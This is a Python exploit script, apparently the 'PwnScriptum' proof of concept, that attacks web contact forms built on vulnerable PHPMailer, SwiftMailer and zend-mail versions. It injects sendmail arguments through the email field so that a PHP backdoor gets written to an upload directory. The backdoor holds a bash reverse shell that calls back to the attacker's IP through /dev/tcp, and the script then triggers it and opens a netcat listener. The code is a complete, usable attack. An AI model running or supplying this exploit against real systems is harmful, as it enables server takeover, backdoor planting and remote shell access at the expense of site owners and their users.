#!/usr/bin/python

intro = """\033[94m 
It combines payloads for the following vulns:

1. PHPMailer < 5.2.18 Remote Code Execution (CVE-2016-10033)
https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html

2. PHPMailer < 5.2.20 Remote Code Execution (CVE-2016-10045 / escapeshell bypass)
https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln.html

3. SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)
https://legalhackers.com/advisories/SwiftMailer-Exploit-Remote-Code-Exec-CVE-2016-10074-Vuln.html

4. Zend Framework / zend-mail < 2.4.11 - Remote Code Execution (CVE-2016-10034)
https://legalhackers.com/advisories/ZendFramework-Exploit-ZendMail-Remote-Code-Exec-CVE-2016-10034-Vuln.html

[Usage]

./PwnScriptum_RCE_exploit.py [-h] -url WEBAPP_BASE_URL -cf CONTACT_SCRIPT
                                  [-d TARGET_UP_DIR] -ip ATTACKERS_IP
                                  [-p ATTACKERS_PORT] [--version]
                                  [--post-action POST_ACTION]
                                  [--post-name POST_NAME]
                                  [--post-email POST_EMAIL]
                                  [--post-msg POST_MSG]

Note, make sure the contact form matches the default field names (send/name/email/msg). 
Otherwise override with --post-msg=message_box for example.

"""

import os
import argparse
import time
import urllib
import urllib2
import socket
import sys


# The Main Meat
print intro

# Show info
if '-H' in sys.argv:
	print info
	exit(0)
# Parse input args
parser = argparse.ArgumentParser(prog='PwnScriptum_RCE_exploit.py', description='PHPMailer / Zend-mail / SwiftMailer - RCE Exploit (a.k.a \'PwnScriptum\')\nDiscovered by Dawid Golunski (https://legalhackers.com)')
parser.add_argument('-H', action='store_true', default="false", required=False,    help='Full Help / Info Page')
parser.add_argument('-url', dest='WEBAPP_BASE_URL', required=True,  help='WebApp Base Url')
parser.add_argument('-cf',  dest='CONTACT_SCRIPT',  required=True,  help='Contact Form scriptname')
parser.add_argument('-d' ,  dest='TARGET_UP_DIR',   required=False, help='Target Upload Dir', default="upload")
parser.add_argument('-ip',  dest='ATTACKERS_IP',    required=True,  help='Attackers Public IP for RevShell')
parser.add_argument('-p',   dest='ATTACKERS_PORT',  required=False, help='Attackers Port for RevShell listener', default="8080")
parser.add_argument('--version', action='version', version='%(prog)s 1.1 Limited PoC')
parser.add_argument('--post-action', dest='POST_ACTION',  required=False, help='Overrides POST "action" field name',         default="send")
parser.add_argument('--post-name',   dest='POST_NAME',    required=False, help='Overrides POST "name of sender" field name', default="name")
parser.add_argument('--post-email',  dest='POST_EMAIL',   required=False, help='Overrides POST "email" field name',          default="email")
parser.add_argument('--post-msg',    dest='POST_MSG',     required=False, help='Overrides POST "message" field name',        default="msg")
args = parser.parse_args()

# Preset vars
TMOUT = 3
# Set Vars
#if args.ATTACKERS_PORT is None:
#	args.ATTACKERS_PORT = 8080
#if args.TARGET_UP_DIR  is None:
#	args.TARGET_UP_DIR = "upload"
# Build the target backdoor URL here (note the "random" pid bit to avoid php code collisions on multiple runs / multiple phpfile appends ;)
BACKDOOR_FILE = 'phpbackdoor' + str(os.getpid()) + '.php'
BACKDOOR_URL  = args.WEBAPP_BASE_URL.rstrip('/') + '/' + args.TARGET_UP_DIR + '/' + BACKDOOR_FILE
CONTACT_SCRIPT_URL = args.WEBAPP_BASE_URL + args.CONTACT_SCRIPT

# Show params
print """[+] Setting vars to: \n
WEBAPP_BASE_URL     = [%s]
CONTACT_SCRIPT      = [%s]
TARGET_UP_DIR       = [%s]
ATTACKERS_IP        = [%s]
ATTACKERS_PORT      = [%s]
CONTACT_SCRIPT_URL  = [%s]
BACKDOOR_FILEl      = [%s]
""" % (args.WEBAPP_BASE_URL, args.CONTACT_SCRIPT, args.TARGET_UP_DIR, args.ATTACKERS_IP, args.ATTACKERS_PORT, CONTACT_SCRIPT_URL, BACKDOOR_FILE)


print "[+] Choose your target / payload: "
print "\033[1;34m"
print """[1] PHPMailer < 5.2.18 Remote Code Execution (CVE-2016-10033)\n"""
print """[2] PHPMailer < 5.2.20 Remote Code Execution (CVE-2016-10045)
	        The escapeshellarg() bypass :)\n"""
print """[3] SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)\n"""
print """[4] Zend Framework / zend-mail < 2.4.11 - Remote Code Execution (CVE-2016-10034)\n"""
print "\033[0m"

try:
    target = int(raw_input('[?] Select target [1-2]: '))
except ValueError:
    print "Not a valid choice. Exiting\n"
    exit(2)
if (target>4):
    print "No such target. Exiting\n"
    exit(3)
if target == 1:
	# PHPMailer < 5.2.18 Remote Code Execution PoC Exploit (CVE-2016-10033)
	payload = '"attacker\\" -oQ/tmp/ -X%s/%s some"@email.com' % (args.TARGET_UP_DIR, BACKDOOR_FILE)
if target == 2:
	# Bypass / PHPMailer < 5.2.20 Remote Code Execution PoC Exploit (CVE-2016-10045)
	payload = "\"attacker\\' -oQ/tmp/ -X%s/%s  some\"@email.com" % (args.TARGET_UP_DIR, BACKDOOR_FILE)
if target == 3:
	# SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)
        payload = '"attacker\\" -oQ/tmp/ -X%s/%s "@email.com' % (args.TARGET_UP_DIR, BACKDOOR_FILE)
if target == 4:
	# Zend Framework / zend-mail < 2.4.11 - Remote Code Execution (CVE-2016-10034)
        payload = '"attacker\\" -oQ/tmp/ -X%s/%s "@email.com' % (args.TARGET_UP_DIR, BACKDOOR_FILE)

print "\n[+] Generated mail() payload will upload the backdoor into the '%s' dir\n" % args.TARGET_UP_DIR
# PHP RCE code to be saved into the backdoor php file on the target in TARGET_UP_DIR. E.g:
# e.g: 
#RCE_PHP_CODE = "<?php phpinfo(); ?>" 
RCE_PHP_CODE = """<?php sleep(%d); system("/bin/bash -c 'nohup bash -i >/dev/tcp/%s/%s 0<&1 2>&1' ");  ?>""" % (TMOUT, args.ATTACKERS_IP, args.ATTACKERS_PORT) 

# The form names might need to be adjusted
post_fields = {'action': "%s" % args.POST_ACTION, "%s" % args.POST_NAME: 'Jas Fasola', "%s" % args.POST_EMAIL: payload, "%s" % args.POST_MSG: RCE_PHP_CODE}

# Attack
# Inject payload into PHPMailer / mail() via a Contact form. This should write out the backdoor
print "[+] Backdoor upload via the contact form at the URL '%s'\n" % CONTACT_SCRIPT_URL
data = urllib.urlencode(post_fields)
req = urllib2.Request(CONTACT_SCRIPT_URL, data)
try:
    urllib2.urlopen(req)
except urllib2.HTTPError, e:
    print "[!] Got HTTP error: [%d] when uploading the payload. Check the URL!\n\n" % e.code
    exit(3)
except urllib2.URLError, err:
    print "[!] Got the '%s' error when uploading the payload. Check the URL!\n\n" % err.reason
    exit(4)

# Check if the backdoor was uploaded correctly.
# A little trick here. The urlopen should timeout at sleep(X)-1 if the backdoor ran fine
# So we catch the timeout to find out.

# Is it uploaded ? Try to execute the PHP backdoor and the Reverse Shell within it
print "[+] Checking for the backdoor at the URL '%s'\n" % BACKDOOR_URL
got_timeout = 0
http_err = 0
try:
    urllib2.urlopen(BACKDOOR_URL, timeout = (TMOUT-1))
except urllib2.HTTPError, e:
    http_err = e.code
except urllib2.URLError, err:
    print "Some other error happened:", err.reason
except socket.timeout, e:
    print "[*] \033[1;32mLooking good!\033[0m The sleep() worked by the looks of it :) \nUrlopen timed out just in time for the shell :)\n"
    got_timeout = 1

if (got_timeout != 1):
    print "[!] Something went wrong... Error [%d]. Try another dir? Push through, don't give up! :)\n" % http_err
    exit(2)

# Spawn the shell and wait for the sleep() PHP call to finish before /bin/bash is called
print "[+] We should get a shell if we got till here! Spawning netcat now! :)\n"
print "[+] \033[1;34mPlease tell me you're seeing this too... ;)\033[0m\n"
os.system("nc -v -l -p %s" % args.ATTACKERS_PORT)

print "\n[+] Shell closed. Removed the uploaded backdoor scripts?\n"

print "\033[1;34mP.$. There's more to it :) Exiting, for now...\033[0m\n"
